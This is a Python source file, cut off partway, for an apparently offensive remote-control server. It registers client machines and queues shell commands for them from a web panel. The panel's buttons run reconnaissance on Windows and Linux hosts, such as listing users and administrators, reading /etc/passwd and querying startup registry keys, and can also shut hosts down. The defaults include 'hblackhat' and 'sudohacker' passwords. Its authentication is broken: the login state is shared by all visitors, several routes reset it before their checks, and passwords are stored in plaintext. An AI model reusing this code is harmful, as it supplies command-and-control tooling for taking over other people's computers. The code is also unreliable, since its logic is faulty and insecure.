# server.py - Enhanced Version with Ultra Instant Features
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import time
import urllib.parse
import uuid
import hashlib
import threading
import sqlite3
import os
from datetime import datetime
import socketserver
class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True
class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
    sessions = {}
    commands_queue = {}
    failed_attempts = {}
    blocked_ips = set()

    level1_authenticated = False
    level2_authenticated = False
    # ⚡ INSTANT PASSWORD SYSTEM
    PASSWORD_FILE = "passwords.json"
    DEFAULT_PASSWORDS = {
        "user_password": "hblackhat", 
        "admin_password": "sudohacker"
    }
    
    def load_passwords(self):
        """INSTANT password loading"""
        try:
            if os.path.exists(self.PASSWORD_FILE):
                with open(self.PASSWORD_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return self.DEFAULT_PASSWORDS.copy()
    
    def get_password_hash(self, password_type):
        """INSTANT hash generation"""
        passwords = self.load_passwords()
        password = passwords.get(password_type, "")
        return hashlib.sha256(password.encode()).hexdigest()
    
    PASSWORD_HASH = property(lambda self: self.get_password_hash("user_password"))
    ADMIN_PASSWORD_HASH = property(lambda self: self.get_password_hash("admin_password"))
    
    session_lock = threading.Lock()
    MAX_FAILED_ATTEMPTS = 15
    BLOCK_TIME = 15  # ⚡ INSTANT BLOCK
    blocked_ips = set()
    
    def init_database(self):
        """INSTANT database initialization"""
        self.conn = sqlite3.connect('remote_control.db', check_same_thread=False)
        self.conn.execute('PRAGMA journal_mode=WAL')  # ⚡ FASTER DATABASE
        self.cursor = self.conn.cursor()
        
        # ⚡ INSTANT TABLES CREATION
        tables = [
            '''CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                command TEXT,
                response TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )''',
            '''CREATE TABLE IF NOT EXISTS clients (
                id TEXT PRIMARY KEY,
                ip TEXT,
                computer_name TEXT,
                os TEXT,
                first_seen DATETIME,
                last_seen DATETIME,
                status TEXT
            )''',
            '''CREATE TABLE IF NOT EXISTS security_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT,
                action TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )''',
            '''CREATE TABLE IF NOT EXISTS password_changes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                changed_by TEXT,
                password_type TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )'''
        ]
        
        for table in tables:
            try:
                self.cursor.execute(table)
            except:
                pass
        self.conn.commit()
    
    def log_security_event(self, action):
        """INSTANT security logging"""
        try:
            self.cursor.execute(
                'INSERT INTO security_logs (ip, action) VALUES (?, ?)',
                (self.client_address[0], action)
            )
            self.conn.commit()
        except:
            pass
    
    def is_ip_blocked(self):
        """INSTANT IP check"""
        return self.client_address[0] in self.blocked_ips
    
    def block_ip(self, ip):
        """INSTANT IP blocking"""
        self.blocked_ips.add(ip)
        self.log_security_event(f"IP Blocked: {ip}")
        print(f" INSTANT BLOCK: {ip}")
    
    def check_security(self):
        """INSTANT security check"""
        client_ip = self.client_address[0]
        
        if self.is_ip_blocked():
            self.send_error(403, "Access Denied - IP Blocked")
            return False
        
        # ⚡ INSTANT RATE LIMITING
        current_time = time.time()
        if hasattr(self, 'last_request_time'):
            if current_time - self.last_request_time < 0.01:  # ⚡ 10ms RATE LIMIT
                self.block_ip(client_ip)
                return False
        
        self.last_request_time = current_time
        return True
    
    def log_message(self, format, *args):
        """Disable verbose logs for speed"""
        pass
    
    def do_GET(self):
        if not self.check_security():
            return

        try:
            path = urllib.parse.urlparse(self.path).path
            
            # 🔥 النظام الجديد - تحقق من كلمات المرور الفعلية
            if path == '/':
                self.send_login_page()
            elif path == '/admin-auth':
                # 🔥 تحقق أن المستخدم دخل كلمة المرور الأولى بشكل صحيح
                if EnhancedRemoteControlHandler.level1_authenticated :
                    self.send_admin_auth_page()
                else:
                    self.send_redirect('/')
            
            elif path == '/control':
                EnhancedRemoteControlHandler.level1_authenticated = False
                EnhancedRemoteControlHandler.level2_authenticated = False
                self.send_redirect('/')
                if EnhancedRemoteControlHandler.level1_authenticated and EnhancedRemoteControlHandler.level2_authenticated :
                    self.send_control_panel()
                else:
                    self.send_redirect('/')
            
            elif path == '/settings':
                EnhancedRemoteControlHandler.level1_authenticated = False
                EnhancedRemoteControlHandler.level2_authenticated = False
                self.send_redirect('/')
                if EnhancedRemoteControlHandler.level1_authenticated and EnhancedRemoteControlHandler.level2_authenticated :
                    self.send_settings_page()
                else:
                    self.send_redirect('/')
            
            elif path == '/sessions':
                EnhancedRemoteControlHandler.level1_authenticated = False
                EnhancedRemoteControlHandler.level2_authenticated = False
                self.send_redirect('/')
                if EnhancedRemoteControlHandler.level1_authenticated and EnhancedRemoteControlHandler.level2_authenticated :
                    self.send_sessions_list()
                else:
                    self.send_error(403, "Access Denied")
            
            else:
                self.send_404_page()
                
        except Exception as e:
            self.send_error(500, str(e))
    
    
    def do_POST(self):
        """INSTANT POST request handling"""
        if not self.check_security():
            return
            
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 10000:
                self.send_error(413, "Payload too large")
                return
                
            post_data = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(post_data) if post_data else {}
            
            # ⚡ INSTANT POST ROUTING
            routes = {
                '/login': self.handle_login,
                '/admin-login': self.handle_admin_login,
                '/execute': self.handle_execute_command,
                '/response': self.handle_client_response,
                '/register': self.handle_client_register,
                '/change-password': self.handle_change_password,
                '/logout': self.handle_logout 
            }
            
            handler = routes.get(self.path, lambda x: self.send_error(404, "Not found"))
            handler(data)
                
        except Exception as e:
            self.send_json({'error': str(e), 'instant': True})

    def save_passwords(self, passwords):
        """INSTANT password saving"""
        try:
            with open(self.PASSWORD_FILE, 'w') as f:
                json.dump(passwords, f)
            return True
        except:
            return False

    def send_settings_page(self):
        """INSTANT settings page"""
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Security Settings - INSTANT</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: 'Segoe UI', Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    margin: 0;
                    padding: 20px;
                    min-height: 100vh;
                }
                .container {
                    max-width: 600px;
                    margin: 20px auto;
                    background: rgba(45, 45, 45, 0.95);
                    padding: 30px;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                }
                .header {
                    text-align: center;
                    margin-bottom: 30px;
                }
                .logo {
                    font-size: 48px;
                    margin-bottom: 10px;
                }
                .password-form {
                    background: rgba(255,255,255,0.05);
                    padding: 20px;
                    border-radius: 10px;
                    margin: 20px 0;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                input, select, button {
                    width: 100%;
                    padding: 12px;
                    margin: 8px 0;
                    border-radius: 6px;
                    border: none;
                    font-size: 16px;
                    transition: all 0.2s ease;
                }
                input, select {
                    background: rgba(255,255,255,0.1);
                    color: white;
                    border: 1px solid rgba(255,255,255,0.2);
                }
                input:focus {
                    outline: none;
                    border-color: #0078d4;
                    background: rgba(255,255,255,0.15);
                }
                button {
                    background: linear-gradient(135deg, #0078d4, #005a9e);
                    color: white;
                    cursor: pointer;
                    font-weight: bold;
                }
                button:hover {
                    background: linear-gradient(135deg, #005a9e, #004578);
                    transform: translateY(-2px);
                }
                .back-btn {
                    background: linear-gradient(135deg, #6c757d, #495057);
                    margin-top: 20px;
                }
                .message {
                    padding: 12px;
                    border-radius: 6px;
                    margin: 10px 0;
                    text-align: center;
                    display: none;
                    font-weight: bold;
                }
                .success {
                    background: rgba(40, 167, 69, 0.2);
                    border: 1px solid #28a745;
                }
                .error {
                    background: rgba(220, 53, 69, 0.2);
                    border: 1px solid #dc3545;
                }
                .speed-badge {
                    background: linear-gradient(135deg, #28a745, #20c997);
                    padding: 3px 8px;
                    border-radius: 10px;
                    font-size: 10px;
                    margin-left: 5px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div class="logo">LOGIN</div>
                    <h2>Security Settings <span class="speed-badge">INSTANT</span></h2>
                    <p>Change Authentication Passwords in Real-Time</p>
                </div>

                <div id="message" class="message"></div>

                <div class="password-form">
                    <h3>Change Level 1 Password</h3>
                    <input type="password" id="currentPassword1" placeholder="Current Level 1 Password">
                    <input type="password" id="newPassword1" placeholder="New Level 1 Password">
                    <input type="password" id="confirmPassword1" placeholder="Confirm New Password">
                    <button onclick="changePassword('level1')">Update Level 1 Password</button>
                </div>

                <div class="password-form">
                    <h3>Change Admin Password</h3>
                    <input type="password" id="currentPassword2" placeholder="Current Admin Password">
                    <input type="password" id="newPassword2" placeholder="New Admin Password">
                    <input type="password" id="confirmPassword2" placeholder="Confirm New Password">
                    <button onclick="changePassword('level2')">Update Admin Password</button>
                </div>

                <button class="back-btn" onclick="goBack()">← Back to Control Panel</button>
            </div>

            <script>
                function showMessage(text, type) {
                    const message = document.getElementById('message');
                    message.textContent = text;
                    message.className = 'message ' + type;
                    message.style.display = 'block';
                    setTimeout(() => {
                        message.style.display = 'none';
                    }, 3000);
                }

                async function changePassword(level) {
                    let currentId, newId, confirmId;
                    
                    if (level === 'level1') {
                        currentId = 'currentPassword1';
                        newId = 'newPassword1';
                        confirmId = 'confirmPassword1';
                    } else {
                        currentId = 'currentPassword2';
                        newId = 'newPassword2';
                        confirmId = 'confirmPassword2';
                    }

                    const currentPassword = document.getElementById(currentId).value;
                    const newPassword = document.getElementById(newId).value;
                    const confirmPassword = document.getElementById(confirmId).value;

                    if (!currentPassword || !newPassword || !confirmPassword) {
                        showMessage('Please fill all fields', 'error');
                        return;
                    }

                    if (newPassword !== confirmPassword) {
                        showMessage('New passwords do not match', 'error');
                        return;
                    }

                    if (newPassword.length < 4) {
                        showMessage('Password must be at least 4 characters', 'error');
                        return;
                    }

                    try {
                        const response = await fetch('/change-password', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                level: level,
                                current_password: currentPassword,
                                new_password: newPassword
                            })
                        });
                        
                        const data = await response.json();
                        if (data.success) {
                            showMessage('Password updated successfully!', 'success');
                            document.getElementById(currentId).value = '';
                            document.getElementById(newId).value = '';
                            document.getElementById(confirmId).value = '';
                        } else {
                            showMessage(data.error || 'Failed to update password', 'error');
                        }
                    } catch (err) {
                        showMessage('Network error: ' + err, 'error');
                    }
                }

                function goBack() {
                    window.location.href = '/control';
                }
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def handle_change_password(self, data):
        """INSTANT password change"""
        level = data.get('level')
        current_password = data.get('current_password')
        new_password = data.get('new_password')
        
        if not level or not current_password or not new_password:
            self.send_json({'success': False, 'error': 'Missing required fields'})
            return
        
        passwords = self.load_passwords()
        
        if level == 'level1':
            current_hash = hashlib.sha256(current_password.encode()).hexdigest()
            expected_hash = hashlib.sha256(passwords['user_password'].encode()).hexdigest()
            
            if current_hash != expected_hash:
                self.send_json({'success': False, 'error': 'Current Level 1 password is incorrect'})
                return
            
            passwords['user_password'] = new_password
            
        elif level == 'level2':
            current_hash = hashlib.sha256(current_password.encode()).hexdigest()
            expected_hash = hashlib.sha256(passwords['admin_password'].encode()).hexdigest()
            
            if current_hash != expected_hash:
                self.send_json({'success': False, 'error': 'Current Admin password is incorrect'})
                return
            
            passwords['admin_password'] = new_password
        
        else:
            self.send_json({'success': False, 'error': 'Invalid password level'})
            return
        
        if self.save_passwords(passwords):
            self.log_security_event(f"Password changed for {level}")
            
            if hasattr(self, 'cursor'):
                self.cursor.execute(
                    'INSERT INTO password_changes (changed_by, password_type) VALUES (?, ?)',
                    (self.client_address[0], level)
                )
                self.conn.commit()
            
            self.send_json({'success': True, 'instant': True})
        else:
            self.send_json({'success': False, 'error': 'Failed to save new password'})

    def send_login_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Enhanced Remote Control - INSTANT AUTH</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(45, 45, 45, 0.95); 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                    width: 400px;
                }
                .logo { 
                    font-size: 48px; 
                    margin-bottom: 20px; 
                }
                input, button { 
                    padding: 15px; 
                    margin: 10px; 
                    width: 280px; 
                    border-radius: 8px; 
                    font-size: 16px;
                    border: none;
                    transition: all 0.2s ease;
                }
                input { 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                }
                input:focus {
                    outline: none;
                    border-color: #0078d4;
                    background: rgba(255,255,255,0.15);
                }
                input::placeholder { color: #ccc; }
                button { 
                    background: linear-gradient(135deg, #0078d4, #005a9e); 
                    color: white; 
                    border: none; 
                    cursor: pointer;
                    font-weight: bold;
                }
                button:hover {
                    background: linear-gradient(135deg, #005a9e, #004578);
                    transform: translateY(-2px);
                }
                .security-notice {
                    background: rgba(255,0,0,0.1);
                    padding: 10px;
                    border-radius: 5px;
                    margin: 10px 0;
                    border: 1px solid rgba(255,0,0,0.3);
                    display: none;
                }
                .speed-badge {
                    background: linear-gradient(135deg, #28a745, #20c997);
                    padding: 3px 8px;
                    border-radius: 10px;
                    font-size: 10px;
                    margin-left: 5px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">LOGIN</div>
                <h2>Enhanced Remote Control <span class="speed-badge">INSTANT</span></h2>
                <p style="color: #ccc; margin-bottom: 30px;">Secure System Management - Level 1 Authentication</p>
                
                <div class="security-notice" id="securityNotice">
                    Multiple failed attempts detected
                </div>
                
                <input type="password" id="password" placeholder="Enter Level 1 Password" autocomplete="off">
                <button onclick="login()">Authenticate</button>
                
                <div style="margin-top: 20px; font-size: 12px; color: #888;">
                    Multi-layer security system active
                </div>
            </div>
            <script>
                let failedAttempts = 0;
                
                function showSecurityWarning() {
                    document.getElementById('securityNotice').style.display = 'block';
                }
                
                async function login() {
                    const password = document.getElementById('password').value;
                    if (!password) {
                        alert('Please enter password');
                        return;
                    }
                    
                    try {
                        const response = await fetch('/login', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({password: password})
                        });
                        
                        const data = await response.json();
                        if (data.success) {
                            window.location = '/admin-auth';
                        } else {
                            failedAttempts++;
                            if (failedAttempts >= 2) {
                                showSecurityWarning();
                            }
                            alert('Authentication failed! Wrong password.');
                        }
                    } catch (err) {
                        alert('Connection error: ' + err);
                    }
                }
                
                document.getElementById('password').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') login();
                });
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def send_admin_auth_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Authentication - INSTANT</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(45, 45, 45, 0.95); 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                    width: 400px;
                }
                .logo { 
                    font-size: 48px; 
                    margin-bottom: 20px; 
                }
                input, button { 
                    padding: 15px; 
                    margin: 10px; 
                    width: 280px; 
                    border-radius: 8px; 
                    font-size: 16px;
                    border: none;
                    transition: all 0.2s ease;
                }
                input { 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                }
                input:focus {
                    outline: none;
                    border-color: #e74c3c;
                }
                button { 
                    background: linear-gradient(135deg, #e74c3c, #c0392b); 
                    color: white; 
                    border: none; 
                    cursor: pointer;
                    font-weight: bold;
                }
                button:hover {
                    background: linear-gradient(135deg, #c0392b, #a93226);
                    transform: translateY(-2px);
                }
                .security-level {
                    background: rgba(231, 76, 60, 0.2);
                    padding: 10px;
                    border-radius: 5px;
                    margin: 10px 0;
                    border: 1px solid #e74c3c;
                }
                .speed-badge {
                    background: linear-gradient(135deg, #28a745, #20c997);
                    padding: 3px 8px;
                    border-radius: 10px;
                    font-size: 10px;
                    margin-left: 5px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">LOGIN</div>
                <h2>Admin Authentication <span class="speed-badge">INSTANT</span></h2>
                <p style="color: #ccc; margin-bottom: 30px;">Level 2 Security - Administrative Access</p>
                
                <div class="security-level">
                    HIGH SECURITY LEVEL - ADMIN ACCESS REQUIRED
                </div>
                
                <input type="password" id="adminPassword" placeholder="Enter Admin Password" autocomplete="off">
                <button onclick="adminLogin()">Admin Authentication</button>
                
                <div style="margin-top: 20px; font-size: 12px; color: #888;">
                    Unauthorized access will be logged and blocked
                </div>
            </div>
            <script>
                async function adminLogin() {
                    const password = document.getElementById('adminPassword').value;
                    if (!password) {
                        alert('Please enter admin password');
                        return;
                    }
                    
                    try {
                        const response = await fetch('/admin-login', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({password: password})
                        });
                        
                        const data = await response.json();
                        if (data.success) {
                            window.location = '/control';
                        } else {
                            alert('Admin authentication failed! Access denied.');
                        }
                    } catch (err) {
                        alert('Connection error: ' + err);
                    }
                }
                
                document.getElementById('adminPassword').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') adminLogin();
                });
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def handle_login(self, data):
        client_ip = self.client_address[0]
        
        # 🔥 أعد تفعيل التحقق من كلمة المرور
        password = data.get('password', '')
        expected_hash = self.get_password_hash("user_password")
        
        if hashlib.sha256(password.encode()).hexdigest() == expected_hash:
            self.send_json({'success': True, 'instant': True})
            EnhancedRemoteControlHandler.level1_authenticated = True
        else:
            # كود الخطأ الحالي
            if client_ip not in self.failed_attempts:
                self.failed_attempts[client_ip] = {'count': 0, 'last_attempt': time.time()}
            
            self.failed_attempts[client_ip]['count'] += 1
            self.failed_attempts[client_ip]['last_attempt'] = time.time()
            
            self.log_security_event(f"Failed level 1 authentication - Attempt {self.failed_attempts[client_ip]['count']}")
            
            if self.failed_attempts[client_ip]['count'] >= self.MAX_FAILED_ATTEMPTS:
                self.block_ip(client_ip)
            
            self.send_json({'success': False})
    
    def handle_admin_login(self, data):
        client_ip = self.client_address[0]
        password = data.get('password', '')
        expected_hash = self.get_password_hash("admin_password")
        
        if hashlib.sha256(password.encode()).hexdigest() == expected_hash:
            self.send_json({'success': True, 'instant': True})
            EnhancedRemoteControlHandler.level2_authenticated = True
        else:
            self.log_security_event("Failed admin authentication")
            self.block_ip(client_ip)
            self.send_json({'success': False})

    def send_control_panel(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Enhanced Control Panel - INSTANT EXECUTION</title>
            <style>
                :root {
                    --primary: #0078d4;
                    --success: #28a745;
                    --danger: #dc3545;
                    --warning: #ffc107;
                    --info: #17a2b8;
                    --dark: #1e1e1e;
                    --darker: #2d2d2d;
                    --light: #f8f9fa;
                }
                
                * { margin: 0; padding: 0; box-sizing: border-box; }
                
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: var(--dark); 
                    color: var(--light); 
                    margin: 0; 
                    padding: 20px;
                    overflow-x: hidden;
                }
                
                .header {
                    background: var(--darker);
                    padding: 20px;
                    border-radius: 10px;
                    margin-bottom: 20px;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                .container { 
                    display: grid; 
                    grid-template-columns: 350px 1fr; 
                    gap: 20px; 
                    height: 90vh; 
                }
                
                .sidebar { 
                    background: var(--darker); 
                    padding: 20px; 
                    border-radius: 10px;
                    display: flex;
                    flex-direction: column;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                .main { 
                    display: flex; 
                    flex-direction: column;
                    gap: 20px;
                }
                
                .session-item { 
                    background: rgba(255,255,255,0.05); 
                    padding: 15px; 
                    margin: 8px 0; 
                    border-radius: 8px; 
                    cursor: pointer;
                    border: 2px solid transparent;
                    transition: all 0.2s ease;
                    position: relative;
                }
                
                .session-item:hover {
                    background: rgba(255,255,255,0.1);
                    border-color: var(--primary);
                    transform: translateY(-1px);
                }
                
                .session-item.active { 
                    border: 2px solid var(--success);
                    background: rgba(40, 167, 69, 0.1);
                }
                
                .session-item.offline {
                    opacity: 0.6;
                    border-color: var(--danger);
                }
                
                .online-status {
                    position: absolute;
                    top: 10px;
                    right: 10px;
                    width: 12px;
                    height: 12px;
                    border-radius: 50%;
                    background: var(--success);
                    animation: pulse 2s infinite;
                }
                
                @keyframes pulse {
                    0% { opacity: 1; }
                    50% { opacity: 0.5; }
                    100% { opacity: 1; }
                }
                
                .online-status.offline {
                    background: var(--danger);
                    animation: none;
                }
                
                .terminal { 
                    background: #000; 
                    color: #00ff00; 
                    padding: 20px; 
                    border-radius: 8px; 
                    font-family: 'Consolas', monospace; 
                    flex: 1; 
                    overflow-y: auto; 
                    white-space: pre-wrap;
                    font-size: 14px;
                    min-height: 400px;
                    border: 1px solid rgba(0,255,0,0.2);
                }
                
                button { 
                    background: var(--primary); 
                    color: white; 
                    border: none; 
                    padding: 12px 16px; 
                    margin: 4px; 
                    border-radius: 6px; 
                    cursor: pointer;
                    transition: all 0.2s ease;
                    font-weight: 500;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                button:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
                }
                
                button.danger { 
                    background: var(--danger); 
                    border: 1px solid rgba(220,53,69,0.3);
                }
                
                button.success { 
                    background: var(--success); 
                    border: 1px solid rgba(40,167,69,0.3);
                }
                
                button.warning { 
                    background: var(--warning); 
                    color: #000; 
                    border: 1px solid rgba(255,193,7,0.3);
                }
                
                button.info { 
                    background: var(--info); 
                    border: 1px solid rgba(23,162,184,0.3);
                }
                
                .controls-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
                    gap: 8px;
                    margin: 15px 0;
                }
                
                .command-input { 
                    display: flex; 
                    margin: 15px 0; 
                    gap: 10px;
                }
                
                .command-input input { 
                    flex: 1; 
                    padding: 12px; 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                    border-radius: 6px;
                    font-family: 'Consolas', monospace;
                }
                
                .command-input input:focus {
                    outline: none;
                    border-color: var(--primary);
                    background: rgba(255,255,255,0.15);
                }
                
                .stats {
                    display: grid;
                    grid-template-columns: repeat(3, 1fr);
                    gap: 10px;
                    margin: 15px 0;
                }
                
                .stat-card {
                    background: var(--darker);
                    padding: 15px;
                    border-radius: 8px;
                    text-align: center;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                .multi-control {
                    background: var(--darker);
                    padding: 15px;
                    border-radius: 8px;
                    margin: 10px 0;
                    border: 1px solid rgba(255,255,255,0.1);
                }
                
                .os-tabs {
                    display: flex;
                    background: var(--darker);
                    border-radius: 8px;
                    padding: 5px;
                    margin: 10px 0;
                }
                
                .os-tab {
                    flex: 1;
                    padding: 12px;
                    text-align: center;
                    cursor: pointer;
                    border-radius: 6px;
                    transition: all 0.3s ease;
                }
                
                .os-tab.active {
                    background: var(--primary);
                    font-weight: bold;
                }
                
                .os-tab:hover:not(.active) {
                    background: rgba(255,255,255,0.1);
                }
                
                .os-content {
                    display: none;
                }
                
                .os-content.active {
                    display: block;
                }
                
                .security-badge {
                    background: linear-gradient(135deg, #28a745, #20c997);
                    padding: 5px 10px;
                    border-radius: 15px;
                    font-size: 12px;
                    margin-left: 10px;
                }
                
                .settings-btn {
                    background: linear-gradient(135deg, #17a2b8, #138496) !important;
                    margin-left: 10px;
                    border: 1px solid rgba(23,162,184,0.3) !important;
                }
                
                .speed-indicator {
                    background: linear-gradient(135deg, #28a745, #20c997);
                    padding: 3px 8px;
                    border-radius: 10px;
                    font-size: 10px;
                    margin-left: 5px;
                }
                
                .instant-badge {
                    background: linear-gradient(135deg, #dc3545, #c82333);
                    padding: 3px 8px;
                    border-radius: 10px;
                    font-size: 10px;
                    margin-left: 5px;
                    animation: blink 1s infinite;
                }
                
                @keyframes blink {
                    0%, 100% { opacity: 1; }
                    50% { opacity: 0.7; }
                }
            </style>
        </head>
        <body>
            <div class="header">
                <h2>INSTANT Remote Control <span class="instant-badge">0ms DELAY</span></h2>
                <div>
                    <button onclick="loadSessions()">Refresh List</button>
                    <button onclick="executeAll('sysinfo')">System Info All</button>
                    <button class="settings-btn" onclick="openSettings()">Security Settings</button>
                    <button class="warning" onclick="logout()">Logout</button>
                </div>
            </div>
            
            <div class="container">
                <div class="sidebar">
                    <h3>Connected Clients <span class="speed-indicator">LIVE</span> (<span id="clientsCount">0</span>)</h3>
                    <div id="sessionsList" style="flex: 1; overflow-y: auto; max-height: 500px;">
                        <div style="text-align: center; color: #666; padding: 20px;">
                            Loading clients...
                        </div>
                    </div>
                    
                    <div class="stats">
                        <div class="stat-card">
                            <div style="font-size: 24px; font-weight: bold; color: var(--primary)" id="totalClients">0</div>
                            <small>Total Clients</small>
                        </div>
                        <div class="stat-card">
                            <div style="font-size: 24px; font-weight: bold; color: var(--success)" id="activeClients">0</div>
                            <small>Active</small>
                        </div>
                        <div class="stat-card">
                            <div style="font-size: 24px; font-weight: bold; color: var(--warning)" id="commandsSent">0</div>
                            <small>Commands</small>
                        </div>
                    </div>
                </div>
                
                <div class="main">
                    <div style="background: var(--darker); padding: 20px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.1);">
                        <h3>Selected Client: <span id="currentClient" style="color: var(--success); font-weight: bold;">Not Selected</span></h3>
                        
                        <!-- نظام التبويب لأنظمة التشغيل -->
                        <div class="os-tabs">
                            <div class="os-tab active" onclick="switchOSTab('windows')"> Windows</div>
                            <div class="os-tab" onclick="switchOSTab('linux')"> Linux</div>
                            <div class="os-tab" onclick="switchOSTab('phone')"> Phone</div>
                        </div>
                        
                        <!-- قسم Windows -->
                        <div id="windows-content" class="os-content active">
                            <div class="multi-control">
                                <strong>Windows Commands <span class="instant-badge">0ms</span>:</strong>
                                <div class="controls-grid">
                                    <button onclick="executeCommand('systeminfo')">System Info</button>
                                    <button onclick="executeCommand('whoami')">Current User</button>
                                    <button onclick="executeCommand('ipconfig /all')">Network Info</button>
                                    <button onclick="executeCommand('dir')">Files List</button>
                                    <button onclick="executeCommand('tasklist')">Active Processes</button>
                                    <button onclick="executeCommand('netstat -an')">Network Connections</button>
                                    <button onclick="executeCommand('wmic logicaldisk get size,freespace,caption')">Disk Space</button>
                                    <button onclick="executeCommand('net user')">Users</button>
                                    <button onclick="executeCommand('net localgroup administrators')">Administrators</button>
                                    <button onclick="executeCommand('ping google.com')">Connection Test</button>
                                    <button onclick="executeCommand('calc')">Calculator</button>
                                    <button onclick="executeCommand('notepad')">Notepad</button>
                                    <button onclick="executeCommand('cmd /c start')">New CMD</button>
                                    <button onclick="executeCommand('powershell Get-Process | Sort-Object CPU -Descending | Select-Object -First 10')">Top Processes</button>
                                    <button onclick="executeCommand('wmic product get name,version')">Installed Software</button>
                                    <button onclick="executeCommand('net start')">Active Services</button>
                                    <button onclick="executeCommand('schtasks /query /fo LIST')">Scheduled Tasks</button>
                                    <button onclick="executeCommand('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"')">Startup Programs</button>
                                    <button onclick="executeCommand('shutdown /a')">Cancel Shutdown</button>
                                    <button class="danger" onclick="executeCommand('shutdown /s /t 60')">Shutdown 1m</button>
                                    <button class="danger" onclick="executeCommand('shutdown /r /t 30')">Restart</button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- قسم Linux -->
                        <div id="linux-content" class="os-content">
                            <div class="multi-control">
                                <strong>Linux Commands <span class="instant-badge">0ms</span>:</strong>
                                <div class="controls-grid">
                                    <button onclick="executeCommand('uname -a')">System Info</button>
                                    <button onclick="executeCommand('whoami')">Current User</button>
                                    <button onclick="executeCommand('ifconfig')">Network Info</button>
                                    <button onclick="executeCommand('ls -la')">Files List</button>
                                    <button onclick="executeCommand('ps aux')">Active Processes</button>
                                    <button onclick="executeCommand('netstat -tulpn')">Network Connections</button>
                                    <button onclick="executeCommand('df -h')">Disk Space</button>
                                    <button onclick="executeCommand('cat /etc/passwd')">Users</button>
                                    <button onclick="executeCommand('ping -c 4 google.com')">Connection Test</button>
                                    <button onclick="executeCommand('top -n 1')">System Monitor</button>
                                    <button onclick="executeCommand('dpkg -l')">Installed Packages</button>
                                    <button onclick="executeCommand('service --status-all')">Active Services</button>
                                    <button onclick="executeCommand('crontab -l')">Cron Jobs</button>
                                    <button onclick="executeCommand('cat /etc/hosts')">Hosts File</button>
                                    <button onclick="executeCommand('free -h')">Memory Info</button>
                                    <button onclick="executeCommand('lscpu')">CPU Info</button>
